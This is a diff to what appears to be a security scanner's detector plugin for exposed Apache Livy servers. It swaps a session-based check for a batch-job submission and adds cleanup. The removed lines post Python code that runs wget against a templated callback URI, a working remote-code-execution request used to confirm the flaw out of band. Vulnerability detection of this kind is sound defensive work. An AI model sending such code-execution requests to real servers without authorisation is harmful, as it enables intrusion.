@@ -45,93 +45,57 @@ actions: {
 }
 
 actions: {
-  name: "create_sessions"
+  name: "create_batches"
   http_request: {
     method: POST
-    uri: "/sessions"
+    uri: "/batches"
     headers: [
       { name: "Content-Type" value: "application/json" }
     ]
-    data: '{"kind":"pyspark"}'
+    data: '{"file":"{{ T_CBS_URI }}"}'
     response: {
       http_status: 201
       expect_all: {
         conditions: { body {} contains: '"proxyUser"' }
-        conditions: { body {} contains: '"kind"' }
+        conditions: { body {} contains: '"sparkUiUrl"' }
       }
       extract_all: {
         patterns: [
           {
             from_body: {}
             regexp: "\"id\":([0-9]+),"
-            variable_name: "sessionid"
+            variable_name: "batch_id"
           }
         ]
       }
     }
   }
+  cleanup_actions: "cleanup_batches"
 }
 
 actions: {
-  name: "sleep_for_session_creation"
-  utility: { sleep: { duration_ms: 60000 } }
-}
-
-actions: {
-  name: "create_statements"
+  name: "cleanup_batches"
   http_request: {
-    method: POST
-    uri: "/sessions/{{ sessionid }}/statements"
-    headers: [
-      { name: "Content-Type" value: "application/json" }
-    ]
-    data:'{"code":"import subprocess\\nsubprocess.run([\\"wget\\",\\"{{ T_CBS_URI }}\\"])"}'
-    response: {
-      http_status: 201
-      expect_all: {
-        conditions: { body {} contains: '"code"' }
-        conditions: { body {} contains: '"state"' }
-        conditions: { body {} contains: '"output"' }
-      }
-      extract_all: {
-        patterns: [
-          {
-            from_body: {}
-            regexp: "\"id\":([0-9]+),"
-            variable_name: "statementid"
-          }
-        ]
-      }
-    }
-  }
-}
-
-actions: {
-  name: "execute_statements"
-  http_request: {
-    method: GET
-    uri: "/sessions/{{ sessionid }}/statements/{{ statementid }}"
+    method: DELETE
+    uri: "/batches/{{ batch_id }}"
     response: {
       http_status: 200
-      expect_all: {
-        conditions: { body {} contains: '"code":"import subprocess\\nsubprocess.run([\\"wget\\",\\"{{ T_CBS_URI }}\\"])"' }
-        conditions: { body {} contains: '"id"' }
-        conditions: { body {} contains: '"output"' }
-      }
     }
   }
 }
 
 actions: {
   name: "sleep_for_callback"
-  utility: { sleep: { duration_ms: 2000 } }
+  utility: { sleep: { duration_ms: 4000 } }
 }
 actions: {
   name: "check_callback_server_logs"
   callback_server: { action_type: CHECK }
 }
 
-
+config:{
+  debug: true
+}
 #############
 # WORKFLOWS #
 #############
@@ -139,10 +103,7 @@ actions: {
 workflows: {
   actions: [
     "livy_exposed_ui_fingerprint",
-    "create_sessions",
-    "sleep_for_session_creation",
-    "create_statements",
-    "execute_statements",
+    "create_batches",
     "sleep_for_callback",
     "check_callback_server_logs"
   ]
